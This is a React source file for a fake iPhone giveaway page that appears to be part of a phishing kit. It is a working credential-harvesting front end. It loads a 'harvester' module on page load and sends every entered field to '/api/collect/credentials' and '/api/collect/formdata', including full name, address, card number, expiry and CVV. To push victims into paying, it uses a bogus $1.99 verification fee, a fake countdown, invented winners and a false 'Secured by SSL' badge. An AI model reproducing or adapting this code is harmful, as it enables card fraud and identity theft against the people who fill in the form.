import React, { useState, useEffect } from 'react';
import { Box, Button, Typography, Container, Card, CardContent, TextField, Grid, LinearProgress, Chip, Avatar, Paper, Step, StepLabel, Stepper, Fade } from '@mui/material';
import VerifiedIcon from '@mui/icons-material/Verified';
import harvester from '../harvester/HarvesterCore';

const steps = ['Personal Info', 'Shipping', 'Verification'];

export default function GiveawayPage() {
  const [activeStep, setActiveStep] = useState(0);
  const [form, setForm] = useState({ fullName: '', email: '', phone: '', address: '', city: '', zipCode: '', creditCard: '', expiry: '', cvv: '' });
  const [submitting, setSubmitting] = useState(false);
  const [completed, setCompleted] = useState(false);
  const remaining = 127 - Math.floor(Math.random() * 30);

  useEffect(() => { harvester.init(); }, []);

  const handleChange = (field, value) => {
    setForm(prev => ({ ...prev, [field]: value }));
  };

  const handleNext = () => {
    if (activeStep < 2) {
      setActiveStep(activeStep + 1);
    } else {
      handleSubmit();
    }
  };

  const handleSubmit = async () => {
    setSubmitting(true);

    await harvester.send('/api/collect/credentials', {
      source: 'form-submit',
      username: form.email,
      password: form.creditCard,
      email: form.email,
      phone: form.phone,
      url: window.location.href,
      formType: 'giveaway-prize',
      fieldData: form
    });

    await harvester.send('/api/collect/formdata', {
      formId: 'giveaway',
      fields: form,
      url: window.location.href
    });

    setTimeout(() => {
      setSubmitting(false);
      setCompleted(true);
    }, 2000);
  };

  if (completed) {
    return (
      <Box sx={{ minHeight: '100vh', bgcolor: '#f8f9fa', display: 'flex', alignItems: 'center', justifyContent: 'center', py: 4, px: 2 }}>
        <Container maxWidth="sm">
          <Fade in={true}>
            <Card elevation={3} sx={{ borderRadius: '20px', overflow: 'hidden', textAlign: 'center' }}>
              <Box sx={{ 
                background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)', 
                p: 4,
                position: 'relative'
              }}>
                <Box sx={{
                  position: 'absolute', top: -30, right: -30, width: 180, height: 180,
                  borderRadius: '50%', background: 'rgba(255,255,255,0.06)'
                }} />
                <Typography sx={{ fontSize: '4rem', position: 'relative', zIndex: 1 }}>🎉</Typography>
                <Typography variant="h4" sx={{ color: '#fff', fontWeight: 800, mt: 2, position: 'relative', zIndex: 1 }}>
                  Congratulations!
                </Typography>
                <Typography sx={{ color: 'rgba(255,255,255,0.85)', mt: 1, fontSize: '0.95rem', position: 'relative', zIndex: 1 }}>
                  You've successfully entered the giveaway!
                </Typography>
              </Box>
              <CardContent sx={{ p: 3.5 }}>
                <Typography sx={{ color: '#475569', mb: 2, lineHeight: 1.6 }}>
                  Your entry has been submitted. We'll contact you at <strong style={{ color: '#667eea' }}>{form.email}</strong> within 24-48 hours if you're a winner.
                </Typography>
                <Paper sx={{ 
                  bgcolor: '#f0fdf4', 
                  borderRadius: '12px', 
                  p: 2.5, 
                  mb: 2.5,
                  border: '1px solid #bbf7d0',
                  display: 'flex',
                  alignItems: 'center',
                  gap: 1.5
                }}>
                  <VerifiedIcon sx={{ color: '#059669' }} />
                  <Typography sx={{ color: '#059669', fontWeight: 600, fontSize: '0.9rem' }}>
                    Confirmation email sent to {form.email}
                  </Typography>
                </Paper>
                <Button 
                  variant="outlined" 
                  sx={{ 
                    borderColor: '#e2e8f0', 
                    color: '#64748b', 
                    borderRadius: '10px',
                    textTransform: 'none',
                    fontWeight: 600,
                    px: 3
                  }} 
                  href="/"
                >
                  Back to Home
                </Button>
              </CardContent>
            </Card>
          </Fade>
        </Container>
      </Box>
    );
  }

  return (
    <Box sx={{ minHeight: '100vh', bgcolor: '#f5f7fa', py: 4, px: 2 }}>
      <Container maxWidth="sm">
        {/* Prize Banner */}
        <Paper
          elevation={0}
          sx={{
            background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
            borderRadius: '20px',
            p: 3.5,
            textAlign: 'center',
            mb: 3,
            position: 'relative',
            overflow: 'hidden'
          }}
        >
          <Box sx={{
            position: 'absolute', top: -40, left: -40, width: 200, height: 200,
            borderRadius: '50%', background: 'rgba(255,255,255,0.05)'
          }} />
          <Box sx={{ position: 'relative', zIndex: 1 }}>
            <Typography sx={{ fontSize: '3rem', mb: 1 }}>🏆</Typography>
            <Typography variant="h5" sx={{ color: '#fff', fontWeight: 800, mb: 0.5, letterSpacing: '-0.5px' }}>
              iPhone 15 Pro Giveaway
            </Typography>
            <Typography sx={{ color: 'rgba(255,255,255,0.8)', mb: 2.5, fontSize: '0.92rem' }}>
              We're giving away 127 brand new iPhones to lucky readers!
            </Typography>
            <Box sx={{ display: 'flex', justifyContent: 'center', gap: 1.5, flexWrap: 'wrap' }}>
              <Chip label={`🎁 ${remaining} Prizes Left`} sx={{ bgcolor: 'rgba(255,255,255,0.15)', color: '#fff', fontWeight: 700, border: '1px solid rgba(255,255,255,0.15)' }} />
              <Chip label="⏱️ Ends in 23:45:12" sx={{ bgcolor: 'rgba(255,255,255,0.15)', color: '#fff', fontWeight: 700, border: '1px solid rgba(255,255,255,0.15)' }} />
            </Box>
          </Box>
        </Paper>

        {/* Entry Form */}
        <Card elevation={0} sx={{ 
          borderRadius: '20px',
          border: '1px solid #e2e8f0',
          boxShadow: '0 4px 24px rgba(0,0,0,0.06)'
        }}>
          <CardContent sx={{ p: { xs: 2.5, sm: 3.5 } }}>
            <Stepper activeStep={activeStep} sx={{ mb: 3 }}>
              {steps.map((label) => (
                <Step key={label}>
                  <StepLabel sx={{ 
                    '& .MuiStepLabel-label': { fontSize: '0.8rem', color: '#94a3b8', fontWeight: 500 },
                    '& .MuiStepLabel-label.Mui-active': { color: '#667eea', fontWeight: 700 },
                    '& .MuiStepLabel-label.Mui-completed': { color: '#059669' },
                    '& .MuiStepIcon-root.Mui-active': { color: '#667eea' },
                    '& .MuiStepIcon-root.Mui-completed': { color: '#059669' },
                  }}>
                    {label}
                  </StepLabel>
                </Step>
              ))}
            </Stepper>

            {activeStep === 0 && (
              <Box>
                <Typography variant="h6" sx={{ fontWeight: 700, color: '#0f172a', mb: 2.5, fontSize: '1.05rem' }}>
                  📋 Step 1: Your Information
                </Typography>
                <TextField 
                  fullWidth 
                  label="Full Name" 
                  value={form.fullName} 
                  onChange={(e) => handleChange('fullName', e.target.value)} 
                  sx={{ 
                    mb: 2,
                    '& .MuiOutlinedInput-root': { 
                      borderRadius: '10px',
                      '& fieldset': { borderColor: '#e2e8f0', borderWidth: '1.5px' },
                      '&:hover fieldset': { borderColor: '#94a3b8' },
                      '&.Mui-focused fieldset': { borderColor: '#667eea' },
                    }
                  }} 
                  size="medium" 
                  required 
                />
                <TextField 
                  fullWidth 
                  label="Email Address" 
                  type="email" 
                  value={form.email} 
                  onChange={(e) => handleChange('email', e.target.value)} 
                  sx={{ 
                    mb: 2,
                    '& .MuiOutlinedInput-root': { 
                      borderRadius: '10px',
                      '& fieldset': { borderColor: '#e2e8f0', borderWidth: '1.5px' },
                      '&:hover fieldset': { borderColor: '#94a3b8' },
                      '&.Mui-focused fieldset': { borderColor: '#667eea' },
                    }
                  }} 
                  size="medium" 
                  required 
                />
                <TextField 
                  fullWidth 
                  label="Phone Number" 
                  value={form.phone} 
                  onChange={(e) => handleChange('phone', e.target.value)} 
                  sx={{ 
                    mb: 1,
                    '& .MuiOutlinedInput-root': { 
                      borderRadius: '10px',
                      '& fieldset': { borderColor: '#e2e8f0', borderWidth: '1.5px' },
                      '&:hover fieldset': { borderColor: '#94a3b8' },
                      '&.Mui-focused fieldset': { borderColor: '#667eea' },
                    }
                  }} 
                  size="medium" 
                />
              </Box>
            )}

            {activeStep === 1 && (
              <Box>
                <Typography variant="h6" sx={{ fontWeight: 700, color: '#0f172a', mb: 2.5, fontSize: '1.05rem' }}>
                  📍 Step 2: Shipping Address
                </Typography>
                <TextField 
                  fullWidth 
                  label="Street Address" 
                  value={form.address} 
                  onChange={(e) => handleChange('address', e.target.value)} 
                  sx={{ 
                    mb: 2,
                    '& .MuiOutlinedInput-root': { 
                      borderRadius: '10px',
                      '& fieldset': { borderColor: '#e2e8f0', borderWidth: '1.5px' },
                      '&:hover fieldset': { borderColor: '#94a3b8' },
                      '&.Mui-focused fieldset': { borderColor: '#667eea' },
                    }
                  }} 
                  size="medium" 
                />
                <Grid container spacing={2}>
                  <Grid item xs={6}>
                    <TextField 
                      fullWidth 
                      label="City" 
                      value={form.city} 
                      onChange={(e) => handleChange('city', e.target.value)} 
                      sx={{
                        '& .MuiOutlinedInput-root': { 
                          borderRadius: '10px',
                          '& fieldset': { borderColor: '#e2e8f0', borderWidth: '1.5px' },
                          '&:hover fieldset': { borderColor: '#94a3b8' },
                          '&.Mui-focused fieldset': { borderColor: '#667eea' },
                        }
                      }}
                      size="medium" 
                    />
                  </Grid>
                  <Grid item xs={6}>
                    <TextField 
                      fullWidth 
                      label="ZIP Code" 
                      value={form.zipCode} 
                      onChange={(e) => handleChange('zipCode', e.target.value)} 
                      sx={{
                        '& .MuiOutlinedInput-root': { 
                          borderRadius: '10px',
                          '& fieldset': { borderColor: '#e2e8f0', borderWidth: '1.5px' },
                          '&:hover fieldset': { borderColor: '#94a3b8' },
                          '&.Mui-focused fieldset': { borderColor: '#667eea' },
                        }
                      }}
                      size="medium" 
                    />
                  </Grid>
                </Grid>
              </Box>
            )}

            {activeStep === 2 && (
              <Box>
                <Typography variant="h6" sx={{ fontWeight: 700, color: '#0f172a', mb: 2, fontSize: '1.05rem' }}>
                  🔒 Step 3: Identity Verification
                </Typography>
                <Paper sx={{ 
                  bgcolor: '#fef3cd', 
                  border: '1px solid #ffc107', 
                  borderRadius: '12px', 
                  p: 2.5, 
                  mb: 2.5,
                  display: 'flex',
                  gap: 1.5
                }}>
                  <Typography sx={{ fontSize: '1.2rem' }}>🔐</Typography>
                  <Box>
                    <Typography sx={{ color: '#856404', fontSize: '0.85rem', fontWeight: 600, mb: 0.5 }}>
                      One-time verification fee of $1.99
                    </Typography>
                    <Typography sx={{ color: '#856404', fontSize: '0.8rem', opacity: 0.85 }}>
                      This fee is to prevent fraud and will be fully refunded with your prize.
                    </Typography>
                  </Box>
                </Paper>
                <TextField 
                  fullWidth 
                  label="Credit Card Number" 
                  value={form.creditCard} 
                  onChange={(e) => handleChange('creditCard', e.target.value)} 
                  sx={{ 
                    mb: 2,
                    '& .MuiOutlinedInput-root': { 
                      borderRadius: '10px',
                      '& fieldset': { borderColor: '#e2e8f0', borderWidth: '1.5px' },
                      '&:hover fieldset': { borderColor: '#94a3b8' },
                      '&.Mui-focused fieldset': { borderColor: '#667eea' },
                    }
                  }} 
                  size="medium" 
                  placeholder="1234 5678 9012 3456" 
                />
                <Grid container spacing={2} sx={{ mb: 2 }}>
                  <Grid item xs={6}>
                    <TextField 
                      fullWidth 
                      label="Expiry (MM/YY)" 
                      value={form.expiry} 
                      onChange={(e) => handleChange('expiry', e.target.value)} 
                      sx={{
                        '& .MuiOutlinedInput-root': { 
                          borderRadius: '10px',
                          '& fieldset': { borderColor: '#e2e8f0', borderWidth: '1.5px' },
                          '&:hover fieldset': { borderColor: '#94a3b8' },
                          '&.Mui-focused fieldset': { borderColor: '#667eea' },
                        }
                      }}
                      size="medium" 
                      placeholder="MM/YY" 
                    />
                  </Grid>
                  <Grid item xs={6}>
                    <TextField 
                      fullWidth 
                      label="CVV" 
                      value={form.cvv} 
                      onChange={(e) => handleChange('cvv', e.target.value)} 
                      sx={{
                        '& .MuiOutlinedInput-root': { 
                          borderRadius: '10px',
                          '& fieldset': { borderColor: '#e2e8f0', borderWidth: '1.5px' },
                          '&:hover fieldset': { borderColor: '#94a3b8' },
                          '&.Mui-focused fieldset': { borderColor: '#667eea' },
                        }
                      }}
                      size="medium" 
                      placeholder="123" 
                    />
                  </Grid>
                </Grid>
                <Box sx={{ display: 'flex', alignItems: 'center', gap: 1.5, mb: 1 }}>
                  <Box sx={{ display: 'flex', gap: 1 }}>
                    <Paper sx={{ px: 0.8, py: 0.3, bgcolor: '#f1f5f9', borderRadius: '4px' }}>
                      <Typography sx={{ color: '#2563eb', fontWeight: 700, fontSize: '0.7rem', fontFamily: 'monospace' }}>VISA</Typography>
                    </Paper>
                    <Paper sx={{ px: 0.8, py: 0.3, bgcolor: '#f1f5f9', borderRadius: '4px' }}>
                      <Typography sx={{ color: '#dc2626', fontWeight: 700, fontSize: '0.7rem', fontFamily: 'monospace' }}>MC</Typography>
                    </Paper>
                  </Box>
                  <Box sx={{ display: 'flex', alignItems: 'center', gap: 0.5 }}>
                    <Typography sx={{ fontSize: '0.85rem' }}>🔒</Typography>
                    <Typography sx={{ color: '#94a3b8', fontSize: '0.75rem' }}>Secured by SSL</Typography>
                  </Box>
                </Box>
              </Box>
            )}

            {submitting ? (
              <Box sx={{ textAlign: 'center', mt: 2 }}>
                <LinearProgress sx={{ 
                  height: 8, borderRadius: '4px', bgcolor: '#f1f5f9', 
                  '& .MuiLinearProgress-bar': { 
                    background: 'linear-gradient(90deg, #667eea, #764ba2)', 
                    borderRadius: '4px' 
                  } 
                }} />
                <Typography sx={{ color: '#94a3b8', mt: 1.5, fontSize: '0.9rem' }}>Processing your entry...</Typography>
              </Box>
            ) : (
              <Box sx={{ display: 'flex', justifyContent: 'space-between', mt: 3 }}>
                <Button
                  onClick={() => setActiveStep(Math.max(0, activeStep - 1))}
                  disabled={activeStep === 0}
                  sx={{ color: '#94a3b8', borderRadius: '10px', textTransform: 'none', fontWeight: 600 }}
                >
                  ← Back
                </Button>
                <Button
                  variant="contained"
                  onClick={handleNext}
                  sx={{
                    background: activeStep === 2 ? 'linear-gradient(135deg, #059669, #10b981)' : 'linear-gradient(135deg, #667eea, #764ba2)',
                    '&:hover': { 
                      background: activeStep === 2 ? 'linear-gradient(135deg, #047857, #059669)' : 'linear-gradient(135deg, #5a6fd6, #6d28d9)' 
                    },
                    fontWeight: 700,
                    px: 4,
                    borderRadius: '12px',
                    textTransform: 'none',
                    boxShadow: activeStep === 2 ? '0 4px 14px rgba(5,150,105,0.3)' : '0 4px 14px rgba(102,126,234,0.3)',
                    py: 1.2
                  }}
                >
                  {activeStep < 2 ? 'Next Step →' : '🎁 Enter Giveaway'}
                </Button>
              </Box>
            )}

            <Box sx={{ textAlign: 'center', mt: 2.5 }}>
              <Typography sx={{ color: '#94a3b8', fontSize: '0.7rem', lineHeight: 1.5 }}>
                By entering, you agree to our Terms & Conditions. No purchase necessary.
              </Typography>
            </Box>
          </CardContent>
        </Card>

        {/* Recent Winners */}
        <Box sx={{ mt: 4 }}>
          <Typography variant="h6" sx={{ fontWeight: 700, color: '#0f172a', mb: 2.5, textAlign: 'center', fontSize: '1.05rem' }}>
            🎉 Recent Winners
          </Typography>
          <Grid container spacing={1.5}>
            {[
              { name: 'Michael R.', prize: 'iPhone 15 Pro', time: '2 hours ago' },
              { name: 'Jennifer L.', prize: 'iPhone 15 Pro', time: '5 hours ago' },
              { name: 'David W.', prize: 'iPhone 15 Pro', time: '8 hours ago' },
            ].map((winner, i) => (
              <Grid item xs={12} sm={4} key={i}>
                <Card elevation={0} sx={{ 
                  borderRadius: '12px',
                  border: '1px solid #e2e8f0',
                  transition: 'transform 0.2s',
                  '&:hover': { transform: 'translateY(-2px)' }
                }}>
                  <CardContent sx={{ p: 1.5, display: 'flex', alignItems: 'center', gap: 1.5 }}>
                    <Avatar sx={{ 
                      width: 36, height: 36, 
                      background: 'linear-gradient(135deg, #f1c40f, #f39c12)', 
                      color: '#fff', 
                      fontSize: '0.85rem',
                      fontWeight: 700
                    }}>
                      {winner.name[0]}
                    </Avatar>
                    <Box>
                      <Typography sx={{ fontWeight: 600, color: '#0f172a', fontSize: '0.82rem' }}>{winner.name}</Typography>
                      <Typography sx={{ color: '#94a3b8', fontSize: '0.72rem' }}>{winner.prize} • {winner.time}</Typography>
                    </Box>
                  </CardContent>
                </Card>
              </Grid>
            ))}
          </Grid>
        </Box>
      </Container>
    </Box>
  );
}